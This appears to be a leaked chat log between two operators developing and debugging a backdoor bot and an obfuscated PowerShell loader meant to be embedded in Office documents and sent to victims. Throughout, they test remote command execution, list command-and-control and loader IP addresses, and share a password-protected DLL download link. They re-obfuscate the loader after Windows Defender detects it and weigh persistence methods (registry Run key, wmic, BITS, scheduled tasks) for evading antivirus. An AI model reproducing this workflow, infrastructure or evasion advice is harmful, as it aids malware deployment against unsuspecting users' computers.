+
+2020-08-19T14:37:38 mushroom -> steller
+runpws channel 60 cd c:\r\ndir\r\n
+
+2020-08-19T14:38:04 mushroom -> steller
+Response doesn't come. In logs Posting command result...
+
+2020-08-19T14:38:19 mushroom -> steller
+And in the admin panel this command is pending...
+
+2020-08-19T14:43:07 mushroom -> steller
+Everything else seems fine. Check the scripts without saving to disk.
+
+2020-08-19T15:03:34 mushroom -> steller
+Test all process start commands and all script start commands.
+
+2020-08-19T15:05:33 mushroom -> steller
+Randomly no response to process start commands comes, writes pending...
+
+2020-08-19T15:06:14 mushroom -> steller
+6966b29479574d5abb89b8bde1a94a45 I ran different ones. You can see that some answers didn't come up there.
+
+2020-08-19T15:06:18 steller -> mushroom
+Last time there were some glitches with the server. Exactly pending was
+
+2020-08-19T15:06:58 mushroom -> steller
+Maybe the glitches are still there.
+
+2020-08-19T15:06:59 mushroom -> steller
+runbat channel 60 cd c:\\r\ndir\r\n
+
+2020-08-19T15:07:08 mushroom -> steller
+The answer is blank, check it out.
+
+2020-08-19T15:07:36 steller -> mushroom
+Yes, I can see that. Already testing
+
+2020-08-19T15:14:56 steller -> mushroom
+ <mushroom> runbat channel 60 cd c:\\r\ndir\r\n
+Forgot \there.
+
+2020-08-19T15:15:46 mushroom -> steller
+cd c:\\r\ndir\r\n
+
+2020-08-19T15:16:00 mushroom -> steller
+Where is it \forgotten?
+
+2020-08-19T15:16:23 steller -> mushroom
+After c:
+
+2020-08-19T15:16:38 mushroom -> steller
+There's a c:\
+
+2020-08-19T15:16:43 mushroom -> steller
+then \r\n
+
+2020-08-19T15:16:50 steller -> mushroom
+Need c:\\ \r\n
+
+2020-08-19T15:17:06 mushroom -> steller
+No. It's C++.
+
+2020-08-19T15:17:23 mushroom -> steller
+There is no need in the admin panel.
+
+2020-08-19T15:17:23 steller -> mushroom
+Yes. This is also where escape is used
+
+2020-08-19T15:17:38 steller -> mushroom
+\r\n what do you think?
+
+2020-08-19T15:18:02 mushroom -> steller
+cd c:\\r\ndir\r\n is what I write in the script field.
+
+2020-08-19T15:19:07 steller -> mushroom
+This is an obvious confusion. Escape should either be used or not used.
+
+2020-08-19T15:19:19 steller -> mushroom
+* In one text
+
+2020-08-19T15:19:36 mushroom -> steller
+The language is different there.
+
+2020-08-19T15:19:52 mushroom -> steller
+If you write c:\\ in c++ it is c:\\\\
+
+2020-08-19T15:19:58 mushroom -> steller
+I've tried.
+
+2020-08-19T15:20:29 mushroom -> steller
+Even if you write a script with an error there, the answer is still blank.
+
+2020-08-19T15:21:02 mushroom -> steller
+Look in the history of this bot wrote the same way and everything worked with the answer as it should.
+
+2020-08-19T15:24:18 mushroom -> steller
+Now I always get no response to the command to start the file.
+
+2020-08-19T15:24:41 mushroom -> steller
+And the reset command works it always gets an answer.
+
+2020-08-19T15:24:55 steller -> mushroom
+You can't check the history. There one \r code is output as 2 characters
+
+2020-08-19T15:25:16 mushroom -> steller
+6966b29479574d5abb89b8bde1a94a45
+
+2020-08-19T15:27:10 mushroom -> steller
+04.08.2020 14:24
+
+2020-08-19T15:27:23 mushroom -> steller
+runbat channel 60 cd c:\\r\ndir\r\n
+
+2020-08-19T15:27:40 mushroom -> steller
+Response:
+pid: 10088
+stdout: cd c:\
+
+c:\>dir
+The volume in device C is labeled BOOTCAMP
+Volume serial number: 0246-9FF7
+
+Contents of the c:\ folder
+
+05/29/1920 11:20 PM <DIR> AMD
+14.12.2019 16:22 170
+AppleBcInstaller.log
+28.01.2020 18:49 5 131 674 england-cumbria-kelly-hall-tarn.jpg
+24.07.2020 13:21 <DIR> LLVM
+07.10.2019 17:41 17,579 MailServerConfig.xml
+07.12.2019 12:14 <DIR> PerfLogs
+31.07.2020 15:35 <DIR>
+Program Files
+15.07.2020 12:05 <DIR> Program Files (x86)
+27.05.2020 13:55 <DIR> Qt
+04.08.2020 17:23 <DIR> temp
+29.05.2020 19:44 <DIR> Users
+17.07.2020 18:54 <DIR> Windows
+3 files
+5 149 423 bytes
+9 folders 49 724 952 576 bytes free
+
+c:\> c:\>
+stderr:
+
+GetLastError(): 183
+
+2020-08-19T15:27:50 mushroom -> steller
+It's in the story.
+
+2020-08-19T15:28:14 mushroom -> steller
+Now this command with a blank response always comes.
+
+2020-08-19T15:28:50 steller -> mushroom
+And from the server codes 10 and 13 should come?
+
+2020-08-19T15:29:47 mushroom -> steller
+So how do you define a team without its number?
+
+2020-08-19T15:30:24 steller -> mushroom
+It seems that previously normal codes 10 13 came from the server, but now garbage \ r \ n
+
+2020-08-19T15:30:56 steller -> mushroom
+I mean ascii encoding
+
+2020-08-19T15:31:40 mushroom -> steller
+I just ran the command 10, it worked correctly.
+
+2020-08-19T15:32:43 mushroom -> steller
+In the logs you can see the correct command numbers.
+
+2020-08-19T15:33:17 mushroom -> steller
+And the commands themselves are spelled correctly.
+
+2020-08-19T15:33:33 steller -> mushroom
+13 = \r , 10 = \n
+
+2020-08-19T15:33:44 steller -> mushroom
+I mean this
+
+2020-08-19T15:33:55 mushroom -> steller
+Here is a command from the log:
+Cmd received: 12 1 60
+cd c:\
+dir
+
+2020-08-19T15:34:29 steller -> mushroom
+That's when ascii 13 10 codes came
+
+2020-08-19T15:34:42 steller -> mushroom
+And now \r\n
+
+2020-08-19T15:35:11 mushroom -> steller
+I haven't had one of these come in yet.
+
+2020-08-19T15:35:42 mushroom -> steller
+In general, the answer is blank for the team, it came as it should.
+
+2020-08-19T15:37:33 mushroom -> steller
+Running it again. I will send the log for it now.
+
+2020-08-19T15:37:58 steller -> mushroom
+Where do you watch it come in?
+
+2020-08-19T15:38:33 mushroom -> steller
+In your logs.
+
+2020-08-19T15:39:03 mushroom -> steller
+It says Cmd Received:
+
+2020-08-19T15:39:26 mushroom -> steller
+Getting command...
+Cmd received: 12 1 60
+cd c:\
+dir
+
+Sleep before getting new command for 300s...
+Posting command result...
+
+2020-08-19T15:39:39 mushroom -> steller
+Came as it should.
+
+2020-08-19T15:40:05 mushroom -> steller
+This is what I got in the admin panel:
+pid: 14168
+stdout:
+
+2020-08-19T15:40:32 mushroom -> steller
+The script came right:
+cd c:\
+dir
+
+2020-08-19T15:40:47 mushroom -> steller
+And the answer is blank.
+
+2020-08-19T15:45:11 mushroom -> steller
+And this is runpws channel 60 cd c:\\r\ndir\r\n
+
+2020-08-19T15:45:22 mushroom -> steller
+Getting command...
+Cmd received: 13 1 60
+cd c:\
+dir
+
+Sleep before getting new command for 300s...
+Posting command result...
+
+2020-08-19T15:45:40 mushroom -> steller
+And all the time.
+
+2020-08-19T15:45:51 mushroom -> steller
+Maybe a server glitch.
+
+2020-08-19T15:45:52 steller -> mushroom
+It's just the way it's displayed. And it seems to be coming from the left command
+
+2020-08-19T15:46:35 mushroom -> steller
+I'll run my bot now, check it out.
+
+2020-08-19T15:47:24 steller -> mushroom
+The 4 \r\n characters in my log are replaced by line breaks.
+
+2020-08-19T15:47:42 mushroom -> steller
+That's 2 characters.
+
+2020-08-19T15:48:04 mushroom -> steller
+That's right, they're line breaks.
+
+2020-08-19T15:49:27 steller -> mushroom
+Ah, no, the normal team comes
+
+2020-08-19T15:49:57 mushroom -> steller
+Everything works for me.
+
+2020-08-19T15:51:10 mushroom -> steller
+And this runpws channel 60 cd c:\r\ndir\r\n
+
+2020-08-19T15:51:14 mushroom -> steller
+It works.
+
+2020-08-19T15:51:28 mushroom -> steller
+And you've got the pending...
+
+2020-08-19T15:51:39 mushroom -> steller
+Check what's up.
+
+2020-08-19T15:54:01 mushroom -> steller
+I'm done for the day. See you tomorrow.
+
+2020-08-19T15:57:52 steller -> mushroom
+Bye
+
+2020-08-20T11:06:55 mushroom -> steller
+Checked the bot now. All commands now work as they should.
+
+2020-08-20T11:07:13 mushroom -> steller
+Answers are coming in.
+
+2020-08-20T11:15:32 steller -> mushroom
+Hi. I uploaded the new version.
+
+2020-08-20T11:43:39 steller -> mushroom
+Did doppel work for you?
+
+2020-08-20T11:47:48 mushroom -> steller
+I haven't tested doppel. It doesn't work 100% on Windows 10.
+
+2020-08-31T12:46:37 mushroom -> steller
+Hi. Buza gave you access to the admin combat. Your group is 9.
+
+2020-08-31T12:46:48 mushroom -> steller
+lowers
+82.146.37.128
+85.143.221.85
+45.138.158.41
+37.220.6.126
+164.132.76.76
+195.123.241.175
+
+
+bot
+91.200.100.85
+212.22.70.4
+194.156.98.46
+37.220.6.122
+51.89.204.242
+195.123.240.52
+
+2020-08-31T12:47:08 mushroom -> steller
+Make changes to the group and addresses.
+
+2020-08-31T12:47:55 mushroom -> steller
+And make battle bootloader and bot builds for group 9.
+
+2020-08-31T12:51:26 mushroom -> steller
+Clarification. You have groups on the battle server like this:
+9 - for tests
+9, 92, 93 - combat
+
+2020-08-31T13:06:10 steller -> mushroom
+Hi. Got it.
+
+2020-09-01T11:02:40 mushroom -> steller
+Hi. Have you done any combat builds for group 9, 92, 93 yet?
+
+2020-09-01T11:03:19 mushroom -> steller
+When you're done, write me. I'll put the uploaders in the documents.
+
+2020-09-01T11:21:10 steller -> mushroom
+Hi. I'll write.
+
+2020-09-01T11:33:18 steller -> mushroom
+Did you give the right address?
+Not downloading https://37.220.6.122/api/v164
+
+2020-09-01T11:35:00 mushroom -> steller
+Try the other one, that's why there are several of them. They die periodically.
+
+2020-09-01T11:36:46 mushroom -> steller
+Are you downloading that bot or downloader?
+
+2020-09-01T11:36:51 steller -> mushroom
+All 404's return.
+
+2020-09-01T11:36:59 steller -> mushroom
+Bot
+
+2020-09-01T11:37:28 mushroom -> steller
+Write to Talar, it's probably a glitch on the server.
+
+2020-09-01T11:37:58 steller -> mushroom
+And the bot is downloaded from the downloader list.
+
+2020-09-01T11:38:22 steller -> mushroom
+And the version of the loader gives out.
+
+2020-09-01T11:38:43 mushroom -> steller
+That's right, the loader is the addresses for the loader.
+
+2020-09-01T11:38:52 steller -> mushroom
+Is the second list just for issuing commands to the bot?
+
+2020-09-01T11:39:10 mushroom -> steller
+The bot is the addresses for the bot, to which it requests commands and sends responses.
+
+2020-09-01T11:40:06 mushroom -> steller
+And the downloader is the addresses for downloading itself a new version and downloading the bot.
+
+2020-09-01T11:41:17 mushroom -> steller
+First it asks for the version of the loader, if it is different, downloads it and runs it, completes itself, the new version will already download and run the bot itself.
+
+2020-09-01T11:54:11 steller -> mushroom
+Bots logged on botleggers?
+
+2020-09-01T11:58:45 mushroom -> steller
+Download it to check it out.
+
+2020-09-01T12:20:37 steller -> mushroom
+Uploaded the uploader and bots. You can check it out.
+
+2020-09-01T12:35:10 mushroom -> steller
+I don't see the bot with group 9. It's running right now.
+
+2020-09-01T12:35:43 mushroom -> steller
+Do you pass cookies with group 9?
+
+2020-09-01T12:36:35 mushroom -> steller
+Did you run it on your computer?
+
+2020-09-01T12:36:50 mushroom -> steller
+There are no bots with group 9.
+
+2020-09-01T12:45:37 steller -> mushroom
+Changed the group from four to nine.
+Bot does not appear in the list.
+
+2020-09-01T13:12:58 mushroom -> steller
+Something to do with cookie passing.
+
+2020-09-01T13:13:54 mushroom -> steller
+If you fix it, write to me. This bot is now as unresolved I think, that's why we don't see it.
+
+2020-09-01T13:19:13 mushroom -> steller
+You can also make the logs write bot id, then you can try to find him if the group as it is now a mess.
+
+2020-09-01T13:20:34 steller -> mushroom
+talar already found it. He is without a band.
+
+2020-09-01T14:03:56 steller -> mushroom
+It's ok. Bot appeared in the group. Check it out.
+
+2020-09-01T14:04:17 mushroom -> steller
+OK.
+
+2020-09-01T14:11:04 mushroom -> steller
+I don't.
+
+2020-09-01T14:11:25 mushroom -> steller
+This one is running now Backdoor build Sep 1 2020 17:01:47
+
+2020-09-01T14:11:59 mushroom -> steller
+Only this ed17f68af885a2b91a416e9f2a19389a I see.
+
+2020-09-01T14:12:10 mushroom -> steller
+And this one isn't mine.
+
+2020-09-01T14:14:46 mushroom -> steller
+ed17f68af885a2b91a416e9f2a19389a is that yours?
+
+2020-09-01T14:17:25 steller -> mushroom
+Yes, that one I added.
+That error is due to the left gaskets. Maybe your first gasket isn't working.
+
+2020-09-01T14:19:40 mushroom -> steller
+Connecting to 51.89.204.242:443...
+Cmd received: 0 302
+
+2020-09-01T14:19:48 mushroom -> steller
+Team comes in.
+
+2020-09-01T14:20:33 mushroom -> steller
+I've already got 3 commands like that coming from the same address, so it means the routing is working.
+
+2020-09-01T14:21:26 mushroom -> steller
+Make the bot's id appear in the log.
+
+2020-09-01T14:21:36 mushroom -> steller
+I'll find the bot right away then.
+
+2020-09-01T14:23:36 steller -> mushroom
+Doesn't work
+
+2020-09-01T14:25:02 steller -> mushroom
+It filters the headlines.
+
+2020-09-02T11:31:13 mushroom -> steller
+Hi. Any progress with the group? I don't see the bot, I checked it on virtual machine and on my computer.
+
+2020-09-02T11:32:46 steller -> mushroom
+Hi. Testing with the new gaskets from greene.
+Waiting to hear back from thalar. He's walking around somewhere.
+
+2020-09-02T11:33:22 mushroom -> steller
+OK.
+
+2020-09-03T07:52:49 steller -> mushroom
+Hi.
+Checked with the pads. The bot should now be added to the group.
+
+2020-09-03T07:56:00 mushroom -> steller
+Hi. Okay.
+
+2020-09-03T08:24:55 mushroom -> steller
+Did you check the bootloader on defender?
+
+2020-09-03T08:25:07 mushroom -> steller
+I had it burned right away.
+
+2020-09-03T08:25:26 mushroom -> steller
+I downloaded the one uploaded in group 9.
+
+2020-09-03T08:25:39 mushroom -> steller
+C:\Users\ivana\Projects\MS Office Payload\new\loader.obf.ps1:1 sign:1
++ &("{1}{0}"-f'm','SET-iTE') VaRiabLE:obX ( [tYPE]("{2}{1}{3}{0}"-F' ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by antivirus software.
+    + CategoryInfo : ParserError: (:) [], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+2020-09-03T08:30:31 mushroom -> steller
+Obfuscate it again.
+
+2020-09-03T09:30:44 steller -> mushroom
+Nah, didn't check it. I'll check it now.
+
+2020-09-03T09:45:24 steller -> mushroom
+It works fine for me.
+What version did you run win/powershell on?
+
+2020-09-03T09:45:57 mushroom -> steller
+5.1.19041.1
+
+2020-09-03T09:47:03 steller -> mushroom
+10?
+
+2020-09-03T09:47:23 mushroom -> steller
+Yes.
+
+2020-09-03T09:47:34 mushroom -> steller
+2004
+
+2020-09-03T09:47:59 mushroom -> steller
+With all updates.
+
+2020-09-03T09:48:42 steller -> mushroom
+I'll take a look on the virtual machine.
+
+2020-09-03T09:51:48 mushroom -> steller
+My antivirus already as soon as I click download it shows Trojan:PowerShell/Mountsi.A!ml
+
+2020-09-03T09:52:52 steller -> mushroom
+Defender?
+
+2020-09-03T09:52:59 mushroom -> steller
+Yes.
+
+2020-09-07T06:50:45 steller -> mushroom
+Hi.
+Tested the script on the updated 10. It works.
+Uploaded it to botleggers
+
+2020-09-07T07:08:15 steller -> mushroom
+Hi.
+Tested the script on the updated 10. It works.
+Uploaded it to botleggers
+
+2020-09-07T08:47:04 steller -> mushroom
+Hi. Did you get the message?
+
+2020-09-07T08:55:01 mushroom -> steller
+Hi. Copy.
+
+2020-09-07T08:55:12 mushroom -> steller
+Busy with other things for now.
+
+2020-09-07T09:07:35 steller -> mushroom
+I'll be gone for the next two weeks from the 14th, if anything.
+
+2020-09-07T09:08:55 mushroom -> steller
+Without the lair did you check how it works?
+
+2020-09-07T09:09:55 steller -> mushroom
+No
+
+2020-09-07T09:14:27 mushroom -> steller
+Check it out, without logs we'll use it in our work.
+
+2020-09-07T09:16:27 steller -> mushroom
+Are your logs working fine yet?
+
+2020-09-07T09:18:31 mushroom -> steller
+The last one I watched yes.
+
+2020-09-07T10:21:59 steller -> mushroom
+Checked not logged x64 bat - it works. Should work just like logged.
+
+2020-09-07T10:22:30 mushroom -> steller
+OK.
+
+2020-09-08T14:29:57 mushroom -> steller
+Hi. I ran your ps1 loader to test it. Got this:
+Behavior:Win32/Persistence.TG!ml
+regkey: HKCU@S-1-5-21-2906645592-891304845-241295008-1001\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\\Update
+runkey: HKCU@S-1-5-21-2906645592-891304845-241295008-1001\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\\Update
+
+2020-09-08T14:30:14 mushroom -> steller
+It's like his attachment was burned by the antivirus.
+
+2020-09-08T14:30:25 mushroom -> steller
+I'll check on a virtual machine again.
+
+2020-09-08T14:33:02 steller -> mushroom
+Got it. There are a few more options for autoloading.
+
+2020-09-08T14:39:31 mushroom -> steller
+Should I take the one loaded in group 9?
+
+2020-09-08T14:41:01 steller -> mushroom
+Do you want it for a packet?
+
+2020-09-08T14:41:34 mushroom -> steller
+Yes for the document.
+
+2020-09-08T14:42:49 steller -> mushroom
+Yes, take it. Active is the one with the latest changes. There may be loading errors.
+
+2020-09-08T14:55:15 mushroom -> steller
+There is no more detection on fixing.
+
+2020-09-08T14:55:25 mushroom -> steller
+Only the script doesn't work.
+
+2020-09-08T14:56:08 mushroom -> steller
+Running it and a bunch of errors like this:
+Cannot find the "viRTUALAdDRESs" property for this object. Make sure it exists.
+C:\Users\ivana\AppData\Local\Temp\loader.obf.ps1:1250 sign:1
++ [IntPtr]${MEm`AD`DRbAsE} = [IntPtr](&('A'+'dd-Si'+'g'+'ned'+'Int'+'As ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo : NotSpecified: (:) [], PropertyNotFoundException
+    + FullyQualifiedErrorId : PropertyNotFoundStrict
+
+2020-09-08T14:56:47 mushroom -> steller
+Check it, you need to put it in a document and give it to work.
+
+2020-09-08T14:58:08 mushroom -> steller
+These are the two errors it writes to infinity when I run the script:
+Cannot find the "sIZeOFFBLoCk" property for this object. Make sure it exists.
+C:\Users\ivana\AppData\Local\Temp\loader.obf.ps1:1246 sign:5
++ if (${BASer`EloCAT`ioNTaB`LE}. "s`IZeOFBL`oCk" -eq 0)
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo : NotSpecified: (:) [], PropertyNotFoundException
+    + FullyQualifiedErrorId : PropertyNotFoundStrict
+
+Cannot find the "viRTUALAdDRESs" property for this object. Make sure it exists.
+C:\Users\ivana\AppData\Local\Temp\loader.obf.ps1:1250 sign:1
++ [IntPtr]${MEm`AD`DRbAsE} = [IntPtr](&('A'+'dd-Si'+'g'+'ned'+'Int'+'As ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo : NotSpecified: (:) [], PropertyNotFoundException
+    + FullyQualifiedErrorId : PropertyNotFoundStrict
+
+2020-09-08T14:58:21 steller -> mushroom
+I'll upload a new one.
+
+2020-09-08T15:02:04 steller -> mushroom
+Uploaded. Check out
+
+2020-09-08T15:07:21 mushroom -> steller
+It worked.
+
+2020-09-08T15:09:36 steller -> mushroom
+Did you get the bot to boot?
+
+2020-09-08T15:09:49 mushroom -> steller
+Yes.
+
+2020-09-08T15:09:56 mushroom -> steller
+With logs.
+
+2020-09-08T15:10:27 steller -> mushroom
+Unlogged doesn't work everywhere. I'll switch to it now. Try it too.
+
+2020-09-09T07:49:28 mushroom -> steller
+Hi. Addresses:
+loaders
+82.146.37.128
+85.143.221.85
+195.123.241.194
+37.220.6.126
+164.132.76.76
+195.123.241.175
+
+
+bot
+93.189.46.41
+212.22.70.4
+194.156.98.46
+93.189.40.214
+54.37.237.253
+185.164.32.107
+
+2020-09-09T07:50:58 mushroom -> steller
+dll can bot download and run?
+
+2020-09-09T09:04:08 mushroom -> steller
+I couldn't get the DLL to run. It gave an error that no such module was found.
+
+2020-09-09T09:04:26 mushroom -> steller
+Checked manually through rundll32 it works.
+
+2020-09-09T09:04:52 mushroom -> steller
+Check to see if the dll is running. This is what you need for work today.
+
+2020-09-09T09:07:55 mushroom -> steller
+dll to check if you don't have it:
+Download: https://qaz.im/load/skKQ87/t2K7HG
+Delete: https://qaz.im/index.php?a=delete&q=850585797
+Password: cAy_`g&O2+N2PmG`f
+
+2020-09-09T09:08:51 mushroom -> steller
+Run with Run function, for example rundll32.exe TestDllOutput64.dll,Run
+
+2020-09-09T09:09:22 mushroom -> steller
+Loader downloaded and ran the bot without logs.
+
+2020-09-09T09:50:34 steller -> mushroom
+Hi. It was running before. I'll double-check now.
+
+2020-09-09T10:25:36 steller -> mushroom
+This program doesn't write anything in stdout, only a window?
+
+2020-09-09T10:25:50 mushroom -> steller
+Yes.
+
+2020-09-09T10:36:12 steller -> mushroom
+Checked x86 & x64. They work.
+
+2020-09-09T10:36:45 steller -> mushroom
+Updated on botleggers, you can download
+
+2020-09-09T10:37:30 mushroom -> steller
+What did you update the bootloader too?
+
+2020-09-09T10:37:51 steller -> mushroom
+Do you need to change addresses?
+
+2020-09-09T10:38:23 mushroom -> steller
+If there are differences with the ones I sent today?
+
+2020-09-09T10:42:36 steller -> mushroom
+A couple of addresses have changed.
+
+2020-09-09T10:43:07 mushroom -> steller
+Replace. So they don't work anymore.
+
+2020-09-09T11:05:14 steller -> mushroom
+Updated. Check it out.
+
+2020-09-09T11:09:00 mushroom -> steller
+A thousand mistakes.
+
+2020-09-09T11:09:19 mushroom -> steller
+Sort of like this:
+Cannot find "AccEpT" property for this object. Make sure it exists and can be set.
+C:\Users\ivana\Projects\MS Office Payload\new\loader.obf.ps1:2187 sign:1
++ ${R`EQ}. "AccE`pT" = ("{19}{1}{7}{20}{12}{22}{5}{23}{4}{10}{14}{11}{15 ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : PropertyNotFound
+
+Cannot call method for expression with NULL value.
+C:\Users\ivana\Projects\MS Office Payload\new\loader.obf.ps1:2188 sign:1
++ ${R`Eq}. "HEa`d`erS".('A'+'dd').Invoke(("{2}{3}{4}{0}{1}" -f 'En','cod ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+
+Cannot find the "USEraGEnT" property for this object. Make sure it exists and can be set.
+C:\Users\ivana\Projects\MS Office Payload\new\loader.obf.ps1:2189 sign:1
++ ${r`eq}. "US`EraGEnT" = ("{1}{11}{12}{0}{10}{2}{3}{5}{9}{6}{4}{8}{7}{1 ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : PropertyNotFound
+
+Cannot find the "tiMEOUT" property for this object. Make sure it exists and can be set.
+C:\Users\ivana\Projects\MS Office Payload\new\loader.obf.ps1:2190 sign:1
++ ${r`eQ}. "ti`MEO`UT" = 2 * 60 * 1000
+
+2020-09-09T11:21:41 steller -> mushroom
+It works now.
+
+2020-09-09T12:01:30 mushroom -> steller
+It works.
+
+2020-09-10T13:20:41 steller -> mushroom
+Hi. Where did these messages come to you from?
+regkey: HKCU@S-1-5-21-2906645592-891304845-241295008-1001\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\\Update
+
+2020-09-10T14:26:29 mushroom -> steller
+Greetings from defender
+
+2020-09-10T14:26:51 mushroom -> steller
+The detector is called Persistense
+
+2020-09-10T14:27:16 steller -> mushroom
+Also on 10x64 2004 updates?
+
+2020-09-10T14:27:43 mushroom -> steller
+Yes, on the latest version.
+
+2020-09-10T14:27:55 steller -> mushroom
+Is this at startup?
+
+2020-09-10T14:28:41 steller -> mushroom
+Tried the same one: didn't catch the detection.
+
+2020-09-10T14:28:54 mushroom -> steller
+Yes, when you run the script. It's a registry entry, I had that with my loader, so I do not use this fastener.
+
+2020-09-10T14:29:42 mushroom -> steller
+And when you add a shortcut in the autorun folder, too, I had a detection with my loader.
+
+2020-09-10T14:32:42 steller -> mushroom
+There are also options for wmic, bits, task.
+Only I don't have such a detector to catch it.
+I can make different variants, then send you, then you can check it?
+
+2020-09-10T14:33:41 mushroom -> steller
+It doesn't always happen for me either. I suspect it happens when the script is run from the temp folder.
+
+2020-09-10T14:34:23 steller -> mushroom
+You mean Appdata ... temp?
+
+2020-09-10T14:34:32 mushroom -> steller
+Make another alternate one to have. So you can take it while you're on vacation.
+
+2020-09-10T14:34:49 mushroom -> steller
+Yes AppData\Local\Temp
+
+2020-09-10T14:35:06 steller -> mushroom
+I'll try to test it
+
+2020-09-11T14:30:30 steller -> mushroom
+Hi.
+Added a couple more variants of bootloader with alternative fixing on botleggers
+
+2020-09-11T15:03:50 mushroom -> steller
+Hi. Okay.
+
+2020-10-07T13:36:50 steller -> mushroom
+Hi.
+You made a loader in js.
+Can you tell me in which environment you debugged it?
+
+2020-10-07T14:58:31 mushroom -> steller
+Loader?
+
+2020-10-07T14:59:05 mushroom -> steller
+I didn't do the loader in js.
+
